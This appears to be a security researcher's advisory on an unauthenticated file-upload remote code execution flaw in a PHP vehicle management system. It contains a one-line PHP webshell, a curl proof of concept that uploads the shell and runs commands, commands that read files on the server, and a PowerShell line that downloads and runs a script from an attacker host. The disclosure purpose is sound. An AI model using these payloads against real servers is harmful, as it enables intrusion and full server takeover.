# Vehicle Management System In PHP - Unauthenticated Remote Code Execution via File Upload in newdriver.php

## Vulnerability Information

| Field | Details |
|---|---|
| **Product** | Vehicle Management System In PHP |
| **Vendor** | code-projects.org |
| **Version** | V1.0 |
| **Vulnerability Type** | Unrestricted File Upload leading to Remote Code Execution (CWE-434) |
| **Files Affected** | `newdriver.php`, `newvehicle.php` |
| **Parameter** | `photo` (POST, multipart/form-data) |
| **Authentication Required** | No (Unauthenticated) |
| **CVSS Score** | 10.0 Critical |
| **Attack Vector** | Remote / Network |
| **Privileges Required** | None |
| **User Interaction** | None |

---

## Description

The **Vehicle Management System In PHP V1.0** by code-projects.org is vulnerable to unauthenticated Remote Code Execution via unrestricted file upload in `newdriver.php` (and identically in `newvehicle.php`).

The application exposes an admin-only "New Driver" registration form at `newdriver.php` that includes a photo upload field. However, the endpoint performs **no session validation** — any unauthenticated attacker can directly access it without being redirected to login. Furthermore, the photo upload field accepts **any file type including PHP files**, with no extension filtering, MIME type validation, or content inspection.

An attacker can:
1. Directly visit `newdriver.php` without any session or credentials
2. Submit the driver form with a PHP webshell as the "photo"
3. The shell is saved to the `/picture/` directory
4. Navigate to the uploaded shell and execute arbitrary OS commands on the server

This results in full Remote Code Execution with the privileges of the web server process.

---

## Vulnerability Chain

```
Unauthenticated HTTP Request
        ↓
newdriver.php (no session check)
        ↓
photo field accepts .php file (no file type validation)
        ↓
Shell saved to /picture/web_shell.php
        ↓
GET /picture/web_shell.php?cmd=whoami
        ↓
RCE — arbitrary OS command execution
```

---

## Steps to Reproduce

### Step 1 — Confirm unauthenticated access to newdriver.php

Open a fresh browser with no session (incognito/private window). Navigate directly to the endpoint:

```
http://TARGET/VEHICLE_MANAGEMENT_SYSTEM_IN_PHP_WITH_SOURCE_CODE/newdriver.php
```

The New Driver Form loads successfully with no authentication check and no redirect to login.

<img width="1920" height="1080" alt="Screenshot 2026-05-19 175610" src="https://github.com/user-attachments/assets/2d7b4563-9115-4b75-ab69-b2cca09652ea" />


---

### Step 2 — Prepare the PHP webshell

Create a simple PHP command execution webshell:

```php
<?php system($_GET['cmd']); ?>
```

Save it as `shell.php` (or any `.php` filename).

---

### Step 3 — Submit the form with the webshell as the photo

Fill in the driver form fields with any values and select the PHP webshell as the photo upload:

```
Driver Name:        test
Mobile:             1234567890
Driver Joining Date: 2026-05-19
National ID:        test
License No:         test
License End Date:   2026-05-30
Driver Address:     test
Photo:              shell.php   ← PHP webshell uploaded here
```

Click **Submit Query**.

<img width="1920" height="1080" alt="Screenshot 2026-05-19 175622" src="https://github.com/user-attachments/assets/3eede3d4-c192-4507-aca5-35a5f1f6ce79" />


<img width="1920" height="1080" alt="Screenshot 2026-05-19 175708" src="https://github.com/user-attachments/assets/7afc7ca9-a339-4b91-aceb-2e505b6430a4" />

---

### Step 4 — Shell upload confirmed

The application responds with **"Registration Completed!"** — confirming the PHP shell was accepted and saved with no validation.

<img width="1920" height="1080" alt="Screenshot 2026-05-19 175718" src="https://github.com/user-attachments/assets/fda6cbe0-b469-42c6-8d69-4a2dd1163977" />


---

### Step 5 — Execute arbitrary commands via the uploaded shell

Navigate to the uploaded shell in the `/picture/` directory and pass OS commands via the `cmd` parameter:

```
http://TARGET/VEHICLE_MANAGEMENT_SYSTEM_IN_PHP_WITH_SOURCE_CODE/picture/shell.php?cmd=whoami
```

The server executes the command and returns the output:

```
desktop-g1i9np3\dell
```

<img width="1920" height="1080" alt="Screenshot 2026-05-19 175759" src="https://github.com/user-attachments/assets/4ac4a7bb-39c5-40d3-a6f3-5ce31ffc5e7c" />


---

### Step 6 — Further command execution examples

```bash
# Read sensitive files
http://TARGET/.../picture/shell.php?cmd=type+C:\xampp\htdocs\VEHICLE_MANAGEMENT_SYSTEM_IN_PHP_WITH_SOURCE_CODE\newdriver.php

# List web root
http://TARGET/.../picture/shell.php?cmd=dir+C:\xampp\htdocs\

# Full reverse shell via PowerShell
http://TARGET/.../picture/shell.php?cmd=powershell+-c+"IEX(New-Object+Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')"
```

---

## Second Affected Endpoint — newvehicle.php

The identical vulnerability exists in `newvehicle.php`. An unauthenticated attacker can access the Add New Vehicle form, upload a PHP webshell via the vehicle photo field, and achieve RCE through the same method.

```
http://TARGET/VEHICLE_MANAGEMENT_SYSTEM_IN_PHP_WITH_SOURCE_CODE/newvehicle.php
```

Both endpoints share the same root cause: no session validation and no file upload restrictions.

---

## curl PoC (One-liner)

```bash
curl -s -X POST \
  "http://TARGET/VEHICLE_MANAGEMENT_SYSTEM_IN_PHP_WITH_SOURCE_CODE/newdriver.php" \
  -F "dname=test" \
  -F "mobile=1234567890" \
  -F "djoiningdate=2026-05-19" \
  -F "nid=test" \
  -F "licenseno=test" \
  -F "licenseenddate=2026-05-30" \
  -F "daddress=test" \
  -F "photo=@shell.php;type=image/jpeg" \
  && echo "[+] Shell uploaded" \
  && curl -s "http://TARGET/VEHICLE_MANAGEMENT_SYSTEM_IN_PHP_WITH_SOURCE_CODE/picture/shell.php?cmd=whoami"
```

---

## Impact

- **Unauthenticated Remote Code Execution** — any anonymous attacker on the network achieves full OS command execution
- **Complete server compromise** — read/write access to all files, credentials, database config
- **No interaction required** — fully automated exploit in a single HTTP request
- **Two affected endpoints** — `newdriver.php` and `newvehicle.php` both vulnerable

---

## Affected Files

| File | Upload Field | Shell Storage Path |
|---|---|---|
| `newdriver.php` | `photo` | `/picture/` |
| `newvehicle.php` | `photo` | `/picture/` |

---

## Vendor Information

- **Vendor Homepage:** https://code-projects.org/vehicle-management-system-in-php-with-source-code/
- **Download:** https://code-projects.org/vehicle-management-system-in-php-with-source-code/

---

## Discovered By

**Syed Imad Uddin Alvi** (imad alvi)  
Independent Security Researcher  
